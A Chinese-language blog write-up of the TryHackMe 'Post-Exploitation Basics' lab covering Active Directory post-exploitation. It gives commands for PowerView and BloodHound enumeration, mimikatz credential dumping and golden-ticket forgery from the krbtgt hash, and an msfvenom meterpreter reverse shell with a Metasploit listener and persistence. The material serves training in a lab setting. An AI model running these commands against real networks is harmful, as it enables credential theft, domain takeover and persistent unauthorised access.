<!DOCTYPE html>
<html>
  <head><meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="generator" content="Hugo 0.124.0">
<meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="description" content="Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom." /><title>Post-Exploitation Basics | Bad Wichell</title>

<link
  rel="icon"
  href="/images/favicon.png"
  type="image/x-icon"
/>
<link
    rel="stylesheet"
    rel="preload"
    type="text/css"
    href="/css/main.css"
  /><link
      rel="stylesheet"
      type="text/css"
      href="/css/external/fontawesome.all.min.css"
    /><link
      rel="stylesheet"
      type="text/css"
      href="/css/external/overlay-scrollbars/overlayscrollbars.min.css"
    />
</head>
  <body onload="browserCompatibility()"><div id="navbarInfo" class="is-hidden modal-container">
  <div class="modal-content-box modal-text-box">
    <div class="card modal-title is-radiusless">
      <div class="card-header">
        <p class="card-header-title is-marginless">About</p>
      </div>
    </div>
    <div class="modal-content-container">
      <div class="modal-content-block is-block">
</div>
    </div>
  </div>
</div>
<div id="navbarShortcuts" class="is-hidden modal-container">
  <div class="modal-content-box modal-text-box"><div class="card modal-title is-radiusless">
        <div class="card-header">
          <p class="card-header-title is-marginless">Keyboard shortcuts</p>
        </div>
      </div>
      <div class="modal-content-container">
        <div class="modal-content-block"><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>q</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Show current page QR code</p>
  </div><div class="modal-content"><kbd>Escape</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Close modals</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>i</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Show website information</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>k</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Show shortcuts</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>h</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Go to homepage</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>f</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Find on website</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>m</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Collapse/Uncollapse sidebar</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>t</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Collapse/Uncollapse table of contents</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>↑</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Go to the top of the page</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>↓</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Go to the bottom of the page</p>
  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>p</kbd></div>
  <div class="modal-content">
    <p class="has-text-weight-normal">Print current page</p>
  </div></div>
      </div></div>
</div>
<div id="modalContainer" class="is-hidden modal-container">
  <div id="modal" class="modal-content-box"></div>
</div>
<nav id="navbar" class="navbar" role="navigation" aria-label="main navigation">
  <div id="navbarItemsContainer" class="navbar-brand"><div id="globalLogoContainer" class="is-flex">
  <a
    id="globalLogo"
    class="navbar-item navbar-item-standard is-paddingless"
    href="/"
  >
    <img
      alt="Homepage"
      src="/images/logo.png"
    />
  </a>
  <a
    id="globalTouchLogo"
    class="navbar-item navbar-item-standard is-paddingless"
    href="/"
  >
    <img
      alt="Homepage"
      src="/images/logoTouch.png"
    />
  </a>
</div>
<div id="navbarItems" class="is-flex">
      <div id="navbarItemsStart" class="is-flex">
        <div id="searchContainer" class="navbar-item"><div class="control has-icons-left">
  <span id="searchInput" class="autocomplete">
    <input
      id="search"
      autocomplete="off"
      class="input"
      type="search"
      placeholder="Search"
    />
  </span>
  <span class="icon is-left">
    <i class="fa-solid fa-magnifying-glass"></i>
  </span>
  <ul id="searchList" class="is-paddingless is-hidden"></ul>
</div>
</div>
      </div>
      <div id="navbarItemsEnd" class="is-flex is-invisible"><div class="navbar-item">
  <a
    id="printButton"
    class="button navbar-item-standard"
  >
    <span class="icon-text">Print</span>
    <span class="icon">
      <i class="fa-solid fa-print fa-lg"></i>
    </span>
  </a>
</div>
<div class="navbar-item">
  <a
    id="qrCodeButton"
    class="button navbar-item-standard"
  >
    <span class="icon-text">QR code</span>
    <span class="icon">
      <i class="fa-solid fa-qrcode fa-lg"></i>
    </span>
  </a>
</div>
<div class="navbar-item">
  <a
    id="shortcutsInfo"
    trigger="navbarShortcuts"
    class="button navbar-item-standard navbar-trigger"
    title="Keyboard shortcuts"
  >
    <span class="icon-text">Shortcuts</span>
    <span class="icon">
      <i class="fa-solid fa-keyboard fa-lg"></i>
    </span>
  </a>
</div><div class="navbar-item"><div
  id="taxonomiesSelectorContainer"
  class="dropdown is-right"
>
  <div class="dropdown-trigger">
    <button
      id="taxonomiesSelector"
      class="button navbar-item-standard"
      aria-haspopup="true"
      aria-controls="dropdown-menu"
    >
      <span class="icon-text">Taxonomies</span>
      <span class="icon">
        <i class="fa-solid fa-tags fa-lg"></i>
      </span>
    </button>
  </div>
  <div
    id="dropdown-menu-taxonomies"
    class="dropdown-menu"
    role="menu"
  >
    <div class="dropdown-content is-paddingless"><a
              href="/categories/"
              class="dropdown-item has-text-weight-bold"
            >Categories</a><a
              href="/tags/"
              class="dropdown-item has-text-weight-bold"
            >Tags</a></div>
  </div>
</div>
</div><div class="navbar-item">
  <a
    id="siteInfo"
    trigger="navbarInfo"
    class="button navbar-item-standard navbar-trigger"
    title="About"
  >
    <span class="icon-text">About</span>
    <span class="icon">
      <i class="fa-solid fa-circle-question fa-lg"></i>
    </span>
  </a>
</div>
<div id="navbarExtend" class="navbar-item">
  <div id="navbarExtendWrapper">
    <a id="navbarExtendButton" class="button navbar-item-standard">
      <span class="icon">
        <i class="fa-solid fa-ellipsis fa-lg"></i>
      </span>
    </a>
    <div id="navbarExtendItemsContainer">
      <div id="navbarExtendItemsWrapper"><div class="navbar-item">
  <a
    id="printButtonExtend"
    class="button navbar-item-standard"
  >
    <span class="icon-text">Print</span>
    <span class="icon">
      <i class="fa-solid fa-print fa-lg"></i>
    </span>
  </a>
</div>
<div class="navbar-item">
  <a
    id="qrCodeButtonExtend"
    class="button navbar-item-standard"
  >
    <span class="icon-text">QR code</span>
    <span class="icon">
      <i class="fa-solid fa-qrcode fa-lg"></i>
    </span>
  </a>
</div>
<div class="navbar-item">
  <a
    id="shortcutsInfoExtend"
    trigger="navbarShortcuts"
    class="button navbar-item-standard navbar-trigger"
    title="Keyboard shortcuts"
  >
    <span class="icon-text">Shortcuts</span>
    <span class="icon">
      <i class="fa-solid fa-keyboard fa-lg"></i>
    </span>
  </a>
</div><div class="navbar-item"><div
  id="taxonomiesSelectorContainerExtend"
  class="dropdown is-right"
>
  <div class="dropdown-trigger">
    <button
      id="taxonomiesSelectorExtend"
      class="button navbar-item-standard"
      aria-haspopup="true"
      aria-controls="dropdown-menu"
    >
      <span class="icon-text">Taxonomies</span>
      <span class="icon">
        <i class="fa-solid fa-tags fa-lg"></i>
      </span>
    </button>
  </div>
  <div
    id="dropdown-menu-taxonomiesExtend"
    class="dropdown-menu"
    role="menu"
  >
    <div class="dropdown-content is-paddingless"><a
              href="/categories/"
              class="dropdown-item has-text-weight-bold"
            >Categories</a><a
              href="/tags/"
              class="dropdown-item has-text-weight-bold"
            >Tags</a></div>
  </div>
</div>
</div><div class="navbar-item">
  <a
    id="siteInfoExtend"
    trigger="navbarInfo"
    class="button navbar-item-standard navbar-trigger"
    title="About"
  >
    <span class="icon-text">About</span>
    <span class="icon">
      <i class="fa-solid fa-circle-question fa-lg"></i>
    </span>
  </a>
</div>
</div>
    </div>
  </div>
</div>
</div>
    </div>
  </div>
</nav>
<div id="navbarOverlay"></div>
<div
      class="columns is-mobile is-paddingless is-marginless"
      id="mainContainer"
    ><div
  id="sidebarContainer"
  class="column is-narrow is-paddingless is-marginless"
>
  <div id="sidebarWrapper" class="is-fixed">
    <div id="sidebar" class="is-marginless">
      <aside class="menu is-paddingless is-marginless">
        <ul class="menu-list is-marginless is-paddingless"><div class="card is-fs-expandable-icon is-sidebar-active"><div class="card-header">
      <a
        href='/attack/'
        class='card-header-title'>
        <i class='fa-solid fa-ghost fa-lg'></i></a></div>
      </div><div class="is-expandable">
      <div class="is-sidebar-list-wrapper"><li class="is-marginless is-tree-active is-entries-expandable is-entries-expanded"><div
            class="card"><div class="card-header">
      <a
        href='/attack/'
        class='card-header-title'
          title='Attack'>
        <i class='fa-solid fa-ghost fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Attack</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-expanded">
                <span class='icon'></span>
              </a>
            </div>
          </div><ul class="is-marginless is-tree-active"><div class="">
      <div class=""><li class="is-marginless is-entries-expandable is-entries-expanded"><div
            class="card"><div class="card-header">
      <a
        href='/attack/tryhackme/'
        class='card-header-title'
          title='Tryhackme'>
        <i class='fa-solid fa-ghost'></i><p class="pt-0 pb-0 pr-2 pl-0">Tryhackme</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-expanded">
                <span class='icon'></span>
              </a>
            </div>
          </div><ul class="is-marginless"><div class="">
      <div class=""><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/attack/tryhackme/attacktive-directory/'
        class='card-header-title'
          title='Attacktive Directory'>
        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Attacktive Directory</p></a></div>
          </div></li>
      </div>
    </div><div class="">
      <div class=""><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/attack/tryhackme/solar-exploting-log4j/'
        class='card-header-title'
          title='Solar, exploiting log4j'>
        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Solar, exploiting log4j</p></a></div>
          </div></li>
      </div>
    </div><div class="">
      <div class=""><li class="is-marginless"><div
            class="card is-sidebar-active"id='sidebarActiveEntry'><div class="card-header is-single-link">
      <a
        href='/attack/tryhackme/post-exploitation-basics-%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/'
        class='card-header-title'
          title='Post-Exploitation Basics'>
        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Post-Exploitation Basics</p></a></div>
          </div></li>
      </div>
    </div><div class="">
      <div class=""><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/attack/tryhackme/bash-scripting/'
        class='card-header-title'
          title='Bash Scripting-TryHackMe'>
        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Bash Scripting-TryHackMe</p></a></div>
          </div></li>
      </div>
    </div><div class="">
      <div class=""><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/attack/tryhackme/linux-strength-training/'
        class='card-header-title'
          title='Linux Strength Training I'>
        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Linux Strength Training I</p></a></div>
          </div></li>
      </div>
    </div></ul></li>
      </div>
    </div><div class="">
      <div class=""><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/attack/hackthebox/'
        class='card-header-title'
          title='HackTheBox'>
        <i class='fa-solid fa-ghost'></i><p class="pt-0 pb-0 pr-2 pl-0">HackTheBox</p></a></div>
          </div></li>
      </div>
    </div></ul></li>
      </div>
    </div><div class="card is-fs-expandable-icon"><div class="card-header is-single-link">
      <a
        href='/tools/'
        class='card-header-title'>
        <i class='fa-solid fa-hammer fa-lg'></i></a></div>
      </div><div class="is-expandable">
      <div class="is-sidebar-list-wrapper"><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/tools/'
        class='card-header-title'
          title='Tools'>
        <i class='fa-solid fa-hammer fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Tools</p></a></div>
          </div></li>
      </div>
    </div><div class="card is-fs-expandable-icon"><div class="card-header is-single-link">
      <a
        href='/sitemap/'
        class='card-header-title'>
        <i class='fa-solid fa-sitemap fa-lg'></i></a></div>
      </div><div class="is-expandable">
      <div class="is-sidebar-list-wrapper"><li class="is-marginless"><div
            class="card"><div class="card-header is-single-link">
      <a
        href='/sitemap/'
        class='card-header-title'
          title='Sitemap'>
        <i class='fa-solid fa-sitemap fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Sitemap</p></a></div>
          </div></li>
      </div>
    </div></ul>
      </aside>
    </div>
    <div id="sidebarCollapsible" class="is-marginless">
      <div class="card is-uncollapse-action">
        <div
          id="sidebarUncollapse"
          class="card-header is-single-link"
          title="Collapse/Uncollapse sidebar"
        >
          <a class="card-header-title">
            <i class="fa-solid fa-angles-right fa-lg"></i>
          </a>
        </div>
      </div>
      <div class="card is-collapse-action">
        <div
          id="sidebarCollapse"
          class="card-header is-single-link"
          title="Collapse/Uncollapse sidebar"
        >
          <a class="card-header-title">
            <i class="fa-solid fa-angles-left fa-lg"></i>
            <p>Collapse sidebar</p>
          </a>
        </div>
      </div>
    </div>
  </div>
</div>
<div id="sidebarMobileWrapper" class="column is-narrow is-hidden-desktop"></div>
<div class="columns is-mobile is-marginless is-scroll-smooth has-toc" id="contentContainer">
  <div class="column" id="content"><div id="contentTitle">Post-Exploitation Basics</div>
<p><img
  src="https://s2.loli.net/2023/05/24/B15AjyT4QwHlFp3.png"
  alt="image.png"
  class="image.png"/>
</p>
<pre><code>使用 mimikatz、bloodhound、powerview 和 msfvenom 学习后期开发和维护访问的基础知识
</code></pre>
<h1 id='房间信息'>房间信息<a href='#%e6%88%bf%e9%97%b4%e4%bf%a1%e6%81%af' class='anchor'>#</a>
</h1><table>
<thead>
<tr>
<th>房间名称</th>
<th><a
  href="https://tryhackme.com/room/postexploit"
    class="is-pretty-link">https://tryhackme.com/room/postexploit</a
>
</th>
</tr>
</thead>
<tbody>
<tr>
<td>描述</td>
<td>后身渗透基础知识</td>
</tr>
<tr>
<td>积分</td>
<td>160💰</td>
</tr>
<tr>
<td>作者</td>
<td>BadWiChell</td>
</tr>
</tbody>
</table>
<h1 id='powerview-枚举'>Powerview 枚举<a href='#powerview-%e6%9e%9a%e4%b8%be' class='anchor'>#</a>
</h1><p>Powerview 是 powershell empire 的一个强大的 powershell 脚本，可用于在您已经在系统中获得 shell 后枚举域。
我们将专注于如何从 PowerView 启动和获取用户和组。</p>
<p>1，启动 Powershell - <code>powershell -ep bypass</code>  -ep 绕过 powershell 的执行策略让你轻松运行脚本。</p>
<blockquote>
<p>powershell -ep bypass的作用是:临时绕过PowerShell的Execution Policy设置,允许运行本地 unsigned 脚本。需要注意的是,该参数只在当前PowerShell会话中临时生效。要永久更改PowerShell的执行策略,需要使用Set-ExecutionPolicy cmdlet。</p>
</blockquote>
<p><img
  src="https://s2.loli.net/2023/05/24/MjCrakFiSQ3GUqs.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>2，启动 PowerView - <code>. .\Downloads\PowerView.ps1</code>，枚举域用户 - <code>Get-NetUser | select cn</code></p>
<p><img
  src="https://s2.loli.net/2023/05/24/4in9maXRNYWtxOJ.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>3 ，枚举域组 - <code>Get-NetGroup -GroupName *admin*</code></p>
<p><img
  src="https://s2.loli.net/2023/05/24/N5ts3S4BLzuVa6Z.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>4，使用 <code>Invoke-ShareFinder</code> 来发现网络共享
Invoke-ShareFinder 的主要功能是:- 搜索当前子网内的 Windows 主机,发现开启的网络共享</p>
<ul>
<li>可以搜索指定IP范围或CIDRblocks内的主机</li>
<li>可以指定要搜索的共享类型,如C$, admin$, IPC$等</li>
<li>支持导出搜索结果到CSV文件</li>
<li>可以使用标准的 PowerShell 管道将输出传递给其他 cmdlet 进行过滤或操作</li>
</ul>
<p><img
  src="https://s2.loli.net/2023/05/24/pc4Xe3yYfBgq8Iv.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>5，查看域中计算机操作系统分布，我们使用 <code>Get-NetComputer -fulldata | select operatingsystem</code></p>
<p>这个命令可以快速查看域环境中的计算机操作系统分布,对安全评估和资产管理非常有用。Get-NetComputer 支持许多参数,如:- Name  指定计算机名获取信息</p>
<ul>
<li>OperatingSystem  指定操作系统获取信息 </li>
<li>ServicePack  指定Service Pack获取信息</li>
<li>Location  指定位置获取信息</li>
<li>Domain   指定域名获取信</li>
</ul>
<p><img
  src="https://s2.loli.net/2023/05/24/n1ZPQEuTL5pUyNe.png"
  alt="image.png"
  class="image.png"/>
</p>
<h1 id='bloodhound-枚举'>Bloodhound 枚举<a href='#bloodhound-%e6%9e%9a%e4%b8%be' class='anchor'>#</a>
</h1><p>BloodHound 是一个开源的图形化 Active Directory 渗透测试工具,用于找出域内对象之间的关系,识别和显示成员身份、权限和所有权。它可以帮助渗透测试人员(红队)和系统管理员更容易地了解 Windows Active Directory 环境。</p>
<p>安装Bloodhound
kali：<code>apt-get install bloodhound </code>
arch：<code>paru -S bloodhound</code> 或 <code>pacman -S bloodhound </code></p>
<p>在终端输入 <code>neo4j console</code>，登陆凭据：neo4j：neo4j</p>
<p>回到靶机中，执行输入：
<code>powershell -ep bypass</code>
临时绕过PowerShell的执行策略,允许运行本地脚本。这是因为SharpHound.ps1是一个本地脚本,默认情况下PowerShell会阻止运行本地脚本,所以需要先使用此命令进行绕过。</p>
<p><code>. .\Downloads\SharpHound.ps1</code>
执行SharpHound.ps1脚本,该脚本用于收集域控制器的各种信息以支持BloodHound工具。</p>
<p><code>Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip</code>
使用SharpHound.ps1中的Invoke-Bloodhound函数来收集域CONTROLLER.local的信息,使用All方法收集所有信息,并将结果打包到loot.zip文件中。</p>
<p><img
  src="https://s2.loli.net/2023/05/24/uNqSkgPFt8TYEmK.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>我们使用 scp 方法，将 loot.zip 文件传输到攻击机中</p>
<p><img
  src="https://s2.loli.net/2023/05/24/WtLwAmvdxSN43zC.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>在 Bloodhound 中搜索这个图标 <img
  src="https://i.imgur.com/rXgtiuK.png"
  alt=""
  class=""/>
 并导入 loot.zip 文件夹
<img
  src="https://i.imgur.com/4LSMKBX.png"
  alt=""
  class=""/>
</p>
<p>查询可以像查找所有域管理员一样简单 -</p>
<p><img
  src="https://i.imgur.com/Eced2zF.png"
  alt=""
  class=""/>
</p>
<p>或者像通往高价值目标的最短路径一样复杂 -</p>
<p><img
  src="https://i.imgur.com/1orYd9p.png"
  alt=""
  class=""/>
</p>
<p>有很多查询可供选择并枚举网络内部的连接</p>
<h1 id='mimikatz'>Mimikatz<a href='#mimikatz' class='anchor'>#</a>
</h1><p>mimikatz 是一个开源的渗透测试工具,用于破解 Windows 操作系统的安全机制。它可以从内存中提取用户的登录密码、PIN 码与 NTLM 哈希,用于身份盗用与权限提升。mimikatz 可以收集系统信息和本地安全凭据,绕过 Windows 身份验证与利用提权技术进行横向移动。</p>
<h2 id='使用-mimikatz-转储哈希'>使用 mimikatz 转储哈希<a href='#%e4%bd%bf%e7%94%a8-mimikatz-%e8%bd%ac%e5%82%a8%e5%93%88%e5%b8%8c' class='anchor'>#</a>
</h2><p><code>cd Downloads &amp;&amp; mimikatz.exe</code> 这将进入 mimikatz 所在的目录并运行 mimikatz 二进制文件
<img
  src="https://i.imgur.com/Mai5nlB.png"
  alt=""
  class=""/>

<code>privilege::debug</code> 确保输出为“Privilege &lsquo;20&rsquo; ok”——这确保您以管理员身份运行 mimikatz；如果您不以管理员身份运行 mimikatz，mimikatz 将无法正常运行
<img
  src="https://i.imgur.com/dgvkXW9.png"
  alt=""
  class=""/>

<code>lsadump::lsa /patch</code> 转储那些哈希值！
<img
  src="https://i.imgur.com/nuhYjkO.png"
  alt=""
  class=""/>
</p>
<h2 id='黄金票据'>黄金票据<a href='#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae' class='anchor'>#</a>
</h2><p>我们同样还是使用 mimikatz, 这次我们来创建黄金票据</p>
<blockquote>
<p>Mimikatz 是一款 Windows 安全工具,可用于提取用户认证信息和权限。它可以创建名为“黄金票据”的令牌,用于实现权限提升和横向移动。黄金票据是具有域管理员或企业管理员权限的标记。攻击者可以使用 Mimikatz 生成黄金票据,然后使用该票据访问受限资源或提高系统权限。</p>
</blockquote>
<p><code>cd downloads &amp;&amp; mimikatz.exe</code>    </p>
<p><code>privilege::debug</code> </p>
<p> <code>lsadump::lsa /inject /name:krbtgt</code> 这会转储 Kerberos Ticket Granting Ticket 帐户的哈希和安全标识符，允许创建黄金票证
 <img
  src="https://s2.loli.net/2023/05/31/CE3W2rIS4yRz6Y9.png"
  alt="image.png"
  class="image.png"/>

记下红色轮廓的内容，需要它来创建金票</p>
<h3 id='创建黄金票据'>创建黄金票据<a href='#%e5%88%9b%e5%bb%ba%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae' class='anchor'>#</a>
</h3><p><code>kerberos::golden /user: /domain: /sid: /krbtgt: /id:</code>
<img
  src="https://s2.loli.net/2023/05/31/TvCdkopHhRyWz1E.png"
  alt="image.png"
  class="image.png"/>
</p>
<h3 id='使用黄金票据访问其他机器'>使用黄金票据访问其他机器<a href='#%e4%bd%bf%e7%94%a8%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e8%ae%bf%e9%97%ae%e5%85%b6%e4%bb%96%e6%9c%ba%e5%99%a8' class='anchor'>#</a>
</h3><p><code>misc::cmd</code> - 这将打开一个新的命令提示符，对所有机器都具有提升的权限
<img
  src="https://s2.loli.net/2023/05/31/GxFSeZ6wOzm5K1g.png"
  alt="image.png"
  class="image.png"/>
</p>
<h1 id='服务器枚举'>服务器枚举<a href='#%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%9e%9a%e4%b8%be' class='anchor'>#</a>
</h1><p>这是 Windows 服务器管理器，第一次打开它时的外观最有趣的主要选项卡是工具和管理选项卡，可以在工具选项卡中找到大部分信息，例如用户、组、信任、计算机。管理选项卡将允许添加角色和功能，但这可能会被系统管理员相对快速地接受。</p>
<p>不要担心 AD CS、AD DS、DNS 或文件和存储服务，它们是为利用活动目录而设置的，对后期利用没有多大用处这是 Windows 服务器管理器在您第一次打开它时的外观最有趣的主要选项卡是工具和管理选项卡，可以在工具选项卡中找到大部分信息，例如用户、组、信任、计算机。管理选项卡将允许添加角色和功能，但这可能会被系统管理员相对快速地接受。</p>
<p>不要担心 AD CS、AD DS、DNS 或文件和存储服务，它们是为利用活动目录而设置的，对后期利用没有多大用处</p>
<p><img
  src="https://s2.loli.net/2023/05/31/iAamUpEwY3LOHVc.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>导航到工具选项卡并选择 Active Directory 用户和计算机
<img
  src="https://s2.loli.net/2023/05/31/7WNs9C8EKvjhHOY.png"
  alt="image.png"
  class="image.png"/>

这将拉出域中所有用户的列表以及其他一些有用的选项卡，例如组和计算机</p>
<p>一些系统管理员没有意识到，作为攻击者可以看到用户帐户的描述，因此他们可能会在描述中设置服务帐户密码查看描述并找到 SQL 服务密码是什么？</p>
<h1 id='权限维持'>权限维持<a href='#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81' class='anchor'>#</a>
</h1><p>﻿有很多方法可以维护机器或网络上的访问权限，我们将介绍一种维护访问权限的相当简单的方法，首先设置一个 meterpreter shell，然后使用允许我们在系统中创建后门服务的持久性 metasploit 模块如果机器关闭或重置，这将为我们提供一个即时的 meterpreter shell。</p>
<p>还有其他维护访问权限的方法，例如高级后门和 Rootkit，但这些超出了本章的范围。</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe</code> 这将生成一个基本的 windows meterpreter 反向 tcp shell</p>
<p><img
  src="https://s2.loli.net/2023/05/31/qF4jLBsRp5KXD16.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>将有效载荷从攻击者机器转移到目标机器。
我这里使用 scp 进行传输：
<img
  src="https://s2.loli.net/2023/05/31/iNgAGuoR6w75mzx.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>下一步是监听：
使用 <code>msfconsole</code>
<code>use exploit/multi/handler</code> - 这将在设置的端口上创建一个监听
将我们的有效负载配置为 Windows meterpreter shell： <code>set payload windows/meterpreter/reverse_tcp</code>
将 THM IP 地址设置为您的“LHOST”后，启动监听器 <code>run</code>
在 windows 机器上执行二进制文件会给你一个 meterpreter shell 回到你的主机上</p>
<p><img
  src="https://s2.loli.net/2023/05/31/Zeuhq2bt3vigcj8.png"
  alt="image.png"
  class="image.png"/>

运行 shell.exe
<img
  src="https://s2.loli.net/2023/05/31/xlR9EZNz6ASVInW.png"
  alt="image.png"
  class="image.png"/>
</p>
<p><code>set session 1</code> 将 session 设置为我们在 meterpreter 中做后台的 session（可以使用 <code>sessions</code> metasploit 中的命令列出活跃的 session）</p>
<p><img
  src="https://s2.loli.net/2023/05/31/osAN8TSFJ3gdLeH.png"
  alt="image.png"
  class="image.png"/>
</p>
<p>在这里你可以看到会话死了，但是第二次我们再次运行处理程序时，由于持久性服务，我们得到了一个 meterpreter shell。</p>
<p>还有其他维护访问权限的方法，例如添加用户和 Rootkit，但我会让您自己对这些主题进行研究和实验。</p>
<p>这个房间为后期开发提供了一个良好的开端，但是还有许多其他方法在不断发展。我建议你出去做你自己的研究，找到你自己喜欢用于后期开发的工具。我希望开设另一个与此类似的房间，涵盖更深入的主题，例如更深入的后门和特洛伊木马、旋转、令牌模拟和银票攻击。我希望这个房间能帮助您更好地了解后期开发在现实场景中的工作原理。</p>
<p>资源 -</p>
<ul>
<li>
<p><a
  href="https://blog.harmj0y.net/"
    class="is-pretty-link">https://blog.harmj0y.net/</a
>
<a
  href="https://blog.harmj0y.net/"
    class="is-pretty-link"></a
>
</p>
</li>
<li>
<p><a
  href="https://adsecurity.org/?page_id=1821"
    class="is-pretty-link">https://adsecurity.org/?page_id=1821</a
>
<a
  href="https://adsecurity.org/?page_id=1821"
    class="is-pretty-link"></a
>
</p>
</li>
<li>
<p><a
  href="https://metasploit.help.rapid7.com/docs/about-post-exploitation"
    class="is-pretty-link">https://metasploit.help.rapid7.com/docs/about-post-exploitation</a
>
</p>
</li>
<li>
<p><a
  href="http://www.pentest-standard.org/index.php/Post_Exploitation"
    class="is-pretty-link">http://www.pentest-standard.org/index.php/Post_Exploitation</a
>
</p>
</li>
<li>
<p><a
  href="https://offsec.red/mimikatz-cheat-sheet/"
    class="is-pretty-link">https://offsec.red/mimikatz-cheat-sheet/</a
>
<a
  href="https://offsec.red/mimikatz-cheat-sheet/"
    class="is-pretty-link"></a
>
</p>
</li>
<li>
<p><a
  href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"
    class="is-pretty-link">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</a
>
<a
  href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"
    class="is-pretty-link"></a
>
</p>
</li>
</ul>
<p>使用的工具/恶意软件 -</p>
<ul>
<li><a
  href="https://github.com/gentilkiwi/mimikatz"
    class="is-pretty-link">https://github.com/gentilkiwi/mimikatz</a
>
<a
  href="https://github.com/gentilkiwi/mimikatz"
    class="is-pretty-link"></a
>
</li>
<li><a
  href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1"
    class="is-pretty-link">https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1</a
>
<a
  href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1"
    class="is-pretty-link"></a
>
</li>
<li><a
  href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
    class="is-pretty-link">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a
>
</li>
</ul>
</div><div class="column is-sticky is-paddingless" id="tocWrapper">
  <div class="is-paddingless" id="tocContainer">
    <div class="toc-header">
      <h6 class="toc-title is-marginless">On this page:</h6>
      <i
        title="Back to top"
        id="tocBackToTop"
        class="fa-solid fa-circle-arrow-up"
      ></i>
    </div>
    <div id="tocContent">
      <div id="toc"><nav id="TableOfContents">
  <ul>
    <li><a href="#使用-mimikatz-转储哈希">使用 mimikatz 转储哈希</a></li>
    <li><a href="#黄金票据">黄金票据</a>
      <ul>
        <li><a href="#创建黄金票据">创建黄金票据</a></li>
        <li><a href="#使用黄金票据访问其他机器">使用黄金票据访问其他机器</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      <div id="taxonomies"><div class="taxonomy-wrapper"><div class="toc-header">
                  <h6 class="toc-title is-marginless">Categories</h6>
                </div><a href="/categories/tryhackme/" class="taxonomy"
                    ><i class="fa-solid fa-circle-dot"></i>Tryhackme</a
                  ><a href="/categories/tools/" class="taxonomy"
                    ><i class="fa-solid fa-circle-dot"></i>Tools</a
                  ></div><div class="taxonomy-wrapper"><div class="toc-header">
                  <h6 class="toc-title is-marginless">Tags</h6>
                </div><a href="/tags/windows/" class="taxonomy"
                    ><i class="fa-solid fa-circle-dot"></i>Windows</a
                  ></div></div>
    </div>
  </div>
  <div
    class="is-paddingless"
    id="tocCollapsible"
    title="Collapse/Uncollapse table of contents"
  >
